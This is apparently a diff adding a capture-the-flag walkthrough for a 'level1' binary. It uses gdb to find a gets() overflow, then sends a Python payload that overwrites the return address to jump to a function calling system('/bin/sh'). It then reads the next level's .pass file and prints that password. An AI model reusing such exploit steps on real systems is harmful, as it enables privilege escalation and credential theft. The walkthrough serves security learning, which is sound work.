@@ -1,0 +1,133 @@
+# The first thing that we found is that we have a binary at the home repository named 'level1'
+# When we execute the program, we see that it reads on stdin and it's waiting for some entry
+# With few tests we can see that the limit of the entry buffer is 75bytes
+# Thanks to gdb we can see that the program uses 'gets' function
+
+gdb ~/level1
+disas main
+
+...
+   0x0804848d <+13>:	mov    %eax,(%esp)
+   0x08048490 <+16>:	call   0x8048340 <gets@plt>
+   0x08048495 <+21>:	leave
+...
+
+# It's a dangerous function that is now depcrecated because gets will read and continue
+# to store characters gets from stdin/ files globaly past the end of the buffer (75 here)
+# With few researchs we can exploit this function to execute other functions through a register in stack
+# When a program is started, the stack will push all informations to execute a function properly (variables...)
+# Once the function has been executed, the stack will pop all saved informations unstead reading a register
+# that will call the next function to execute
+# Once we know that, we'll change the address in the register to execute a function that we want to execute
+#
+# By exploring deeper the level1 program, we can found two more functions that is writen 'run' and 'frame_dummy'
+
+info functions
+
+...
+0x080483c0  __do_global_dtors_aux
+0x08048420  frame_dummy
+0x08048444  run
+0x08048480  main
+0x080484a0  __libc_csu_init
+...
+
+# Thanks to disas command, we can see that frame_dummy is not interesting but run is
+# We can see that it execute a system call
+
+disas run
+...
+   0x0804846a <+38>:	mov    %eax,(%esp)
+   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
+   0x08048472 <+46>:	movl   $0x8048584,(%esp)
+   0x08048479 <+53>:	call   0x8048360 <system@plt>
+   0x0804847e <+58>:	leave
+...
+
+# We can see a call for fwrite function too
+# By checking informations pushed on stack at the begining of disas, we can see this string:
+
+...
+   0x0804844f <+11>:	mov    %eax,%edx
+   0x08048451 <+13>:	mov    $0x8048570,%eax
+   0x08048456 <+18>:	mov    %edx,0xc(%esp)
+...
+
+# Thanks to x/s command (print address as string) we have the value of $0x8048570 and $0x8048584 (from system call)
+
+x/s 0x8048570
+0x8048570:	 "Good... Wait what?\n"
+
+x/s 0x8048584
+0x8048584:	 "/bin/sh"
+
+# It means that we are on the good way, maybe?
+# Before we have deduced that we have to execute a function through gets function
+# Let's try to execute 'run' function...
+#
+# To do that, as explained before, we have to give the address of run into the eip register in stack
+# As we know, the buffer of the waiting input is 75, let's find with gdb where the eip register is called
+# To know that, we'll see thanks to gdb again when the adress of what we give in parameter is called
+# If we send a 'B' char the address of the function called will end by 4242 (the program will read the next 'case' of memory until reading eip(the next function to call)
+# if the address of 'B' is writen it's because eip is reached and the program try to execute 'B', see below)
+
+(again in gdb)
+# 76 chars
+(gdb) r
+Starting program: /home/user/level1/level1
+BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+
+Program received signal SIGILL, Illegal instruction.
+0xb7e45400 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6
+
+# 77 chars
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/level1/level1
+BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb7e400a4 in ?? () from /lib/i386-linux-gnu/libc.so.6
+
+# 78 chars
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/level1/level1
+BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb7004242 in ?? ()
+
+# As we see, when we execute the program with 78 chars, the function at address 0xb7004242 does not exists, it's our 'B' char
+# We can try our exploit on the range of 76 and 80 chars (the size of an address is 4 bytes 0x 0xXXXX)
+# Let's find the address of run function with gdb
+
+disas run
+Dump of assembler code for function run:
+   0x08048444 <+0>:	push   %ebp
+   0x08048445 <+1>:	mov    %esp,%ebp
+...
+
+# The address that we want is the first one that call the function (<+0>: push)
+# Here is 0x08048444, we'll write at the end of the buffer the address 44840408 (EXPLAIN HERE WHY IN REVERSE)
+# Thanks to python, we'll fill the buffer of 76 chars (and more if needed) and the address of the function like this:
+
+(python -c "print('B' * 76 + '\x44\x84\x04\x08')"; cat -)
+
+# And execute the program
+
+(python -c "print('B' * 76 + '\x44\x84\x04\x08')"; cat -) | ~/level1
+Good... Wait what?
+
+
+# We are now in a shell executed by user level2 (the owner of the binary)
+
+whoami
+level2
+
+# Let's check the .pass file
+
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
